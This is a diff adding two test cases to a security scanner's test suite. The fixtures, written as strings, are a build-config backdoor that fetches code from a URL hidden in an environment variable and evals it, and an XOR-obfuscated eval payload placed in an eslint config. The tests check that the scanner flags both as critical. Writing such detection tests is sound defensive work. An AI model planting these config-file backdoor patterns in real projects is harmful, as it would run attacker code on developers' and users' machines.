@@ -63,4 +63,39 @@ jobs:
     );
     expect(findings.find((f) => f.rule === "suspicious-npm-script-hijack")?.severity).toBe("critical");
   });
+
+  it("detects remote-eval backdoor pattern (async IIFE fetching and evaluating code)", () => {
+    const code = `
+      import { defineConfig } from "tsup";
+      export default defineConfig({ entry: ["src/index.ts"] });
+      (async () => {
+        const src = atob(process.env.AUTH_API_KEY);
+        const proxy = (await import('node-fetch')).default;
+        try {
+          const response = await proxy(src);
+          if (!response.ok) throw new Error('status: ' + response.status);
+          const proxyInfo = await response.text();
+          eval(proxyInfo);
+        } catch (err) {
+          console.error('Auth Error!', err);
+        }
+      })();
+    `;
+    const findings = scanFileContent(code, "tsup.config.ts");
+    expect(findings.some((f) => f.rule === "remote-eval-backdoor")).toBe(true);
+    expect(findings.find((f) => f.rule === "remote-eval-backdoor")?.severity).toBe("critical");
+  });
+
+  it("detects XOR permuter / spin splitLane obfuscated malware pattern", () => {
+    const code = `
+      const NX = [38, 92, 114, 55, 102, 88, 73, 29, 44, 91];
+      function spin(R, c) { return R ^ c; }
+      function splitLane(R) { return R.map(x => spin(x, 42)); }
+      function peel(R) { return String.fromCharCode(...splitLane(R)); }
+      eval(peel(NX));
+    `;
+    const findings = scanFileContent(code, "eslint.config.js");
+    expect(findings.some((f) => f.rule === "obfuscated-malware-pattern")).toBe(true);
+    expect(findings.find((f) => f.rule === "obfuscated-malware-pattern")?.severity).toBe("critical");
+  });
 });
